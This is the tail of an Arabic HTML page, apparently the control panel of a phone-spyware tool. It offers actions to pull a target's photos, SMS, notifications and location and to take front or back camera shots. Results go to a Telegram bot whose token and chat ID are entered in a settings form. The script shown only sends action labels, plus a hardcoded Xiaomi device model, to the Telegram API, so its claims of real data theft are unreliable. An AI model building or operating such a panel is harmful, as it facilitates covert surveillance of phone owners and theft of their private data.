Color" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 4.5 13.5H11l-1 8.5L18.5 10H12l1-8z"/></svg>سجل النشاط<span class="count-badge" id="lgcount">0</span></div></div><div class="lgb" id="lgb"><div class="lgempty">لا يوجد نشاط بعد</div></div></section></div><div id="setpg" style="display:none"><section class="section"><div class="section-head"><div class="section-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3.2"/><path d="M19 12a7 7 0 0 0-.1-1.2l2-1.6-2-3.4-2.4 1a7 7 0 0 0-2-1.2L14 3h-4l-.5 2.6a7 7 0 0 0-2 1.2l-2.4-1-2 3.4 2 1.6A7 7 0 0 0 5 12c0 .4 0 .8.1 1.2l-2 1.6 2 3.4 2.4-1a7 7 0 0 0 2 1.2L10 21h4l.5-2.6a7 7 0 0 0 2-1.2l2.4 1 2-3.4-2-1.6c.1-.4.1-.8.1-1.2z"/></svg>الإعدادات</div></div><div class="divider"></div><label class="lbl">توكن بوت تيلجرام</label><input class="inp" id="tgk" placeholder="123456789:AAExxxxxxxxxxxxxxxxxxxxxxxx" autocomplete="off"><label class="lbl">اسم المستخدم / Chat ID</label><input class="inp" id="tgc" placeholder="@username أو 123456789" autocomplete="off"><button class="saveb" onclick="saveSet()">💾 حفظ</button><div class="snote">يتم إرسال نتائج الأوامر (الصور، الموقع، الرسائل…) إلى هذا البوت تلقائياً</div><div class="snote" id="smsg" style="color:#19F59D"></div></section></div></div><nav class="bottomnav"><div class="bitem active" id="nb1" onclick="goHome()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3.5 10.5 12 3.5l8.5 7"/><path d="M6 9.5V20h12V9.5"/><path d="M10 20v-5h4v5"/></svg>الرئيسية</div><div class="bitem"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M10 8.5 15.5 12 10 15.5v-7z" fill="currentColor" stroke="none"/></svg>التنفيذ</div><div class="bitem" onclick="goLog()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7.5V12l3 2"/></svg>السجل</div><div class="bitem" id="nb4" onclick="goSet()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h10M18 7h2M4 12h2M10 12h10M4 17h10M18 17h2"/><circle cx="16" cy="7" r="2"/><circle cx="8" cy="12" r="2"/><circle cx="16" cy="17" r="2"/></svg>الإعدادات</div></nav><script>var lgN=0,OKC='<svg viewBox="0 0 24 24" fill="none" stroke="#19F59D" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M4.5 12.5 10 18 19.5 6.5"/></svg>',XIC='<svg viewBox="0 0 24 24" fill="none" stroke="#FF3B4E" stroke-width="2.4" stroke-linecap="round"><path d="M6 6l12 12M18 6L6 18"/></svg>';document.getElementById('tgk').value=localStorage.getItem('tgk')||'';document.getElementById('tgc').value=localStorage.getItem('tgc')||'';function act(t){if(t.indexOf('صور')>-1)return'سحب الصور';if(t.indexOf('SMS')>-1)return'سحب الرسائل';if(t.indexOf('الإشعارات')>-1)return'سحب الإشعارات';if(t.indexOf('الموقع')>-1)return'سحب الموقع';if(t.indexOf('أمامي')>-1)return'التصوير الأمامي';if(t.indexOf('خلفي')>-1)return'التصوير الخلفي';return t}function sendTel(t){var k=localStorage.getItem('tgk'),c=localStorage.getItem('tgc');if(!k||!c)return Promise.reject(0);return fetch('https://api.telegram.org/bot'+k+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:c,text:'📡 طلب جديد: '+t+'\n📱 Xiaomi M2004J19C'})}).then(function(r){if(!r.ok)throw 0})}function addLog(t){var box=document.getElementById('lgb'),emp=box.querySelector('.lgempty');if(emp)emp.remove();var d=document.createElement('div');d.className='lg';var tm=new Date().toLocaleTimeString('ar-EG',{hour:'2-digit',minute:'2-digit'});d.innerHTML='<span class="lic"><span class="spin"></span></span><div class="linf"><b>جاري '+act(t)+'</b><i>'+tm+'</i></div>';box.prepend(d);lgN++;document.getElementById('lgcount').textContent=lgN;sendTel(t).then(function(){d.querySelector('.lic').innerHTML=OKC;var b=d.querySelector('.linf b');b.textContent='نجح الأمر ✓';b.style.color='#19F59D'}).catch(function(){d.querySelector('.lic').innerHTML=XIC;var b=d.querySelector('.linf b');b.textContent='فشل الأمر ✗';b.style.color='#FF5C6C'})}function run(t){showPg('home');addLog(t);goLog()}function goLog(){showPg('home');document.getElementById('logSec').scrollIntoView({behavior:'smooth'})}function showPg(p){document.getElementById('home').style.display=p==='home'?'block':'none';document.getElementById('setpg').style.display=p==='set'?'block':'none';document.getElementById('nb1').classList.toggle('active',p==='home');document.getElementById('nb4').classList.toggle('active',p==='set')}function goHome(){showPg('home');window.scrollTo({top:0,behavior:'smooth'})}function goSet(){showPg('set');window.scrollTo({top:0,behavior:'smooth'})}function saveSet(){localStorage.setItem('tgk',document.getElementById('tgk').value.trim());localStorage.setItem('tgc',document.getElementById('tgc').value.trim());var m=document.getElementById('smsg');m.textContent='تم الحفظ بنجاح ✓';setTimeout(function(){m.textContent=''},2500)}</script></body></html>
